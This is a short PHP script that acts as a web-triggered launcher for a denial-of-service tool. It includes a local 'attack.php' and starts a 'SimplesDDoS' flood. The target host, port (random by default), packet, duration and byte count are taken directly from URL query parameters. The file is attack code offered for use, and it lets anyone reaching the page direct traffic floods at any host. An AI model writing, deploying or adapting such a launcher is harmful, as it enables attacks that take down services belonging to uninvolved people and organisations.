<?php 

require("./attack.php");

$ddosScript = new SimplesDDoS([
  'host' => $_GET['host'],
  'port' => $_GET['port']??rand(1,rand(1,65535)),
  'packet' => $_GET['packet'],
  'time' => $_GET['time'],
  'execution_interval' => $_GET['execution_interval'],
  'bytes' => $_GET['bytes']
]);
$ddosScript->start();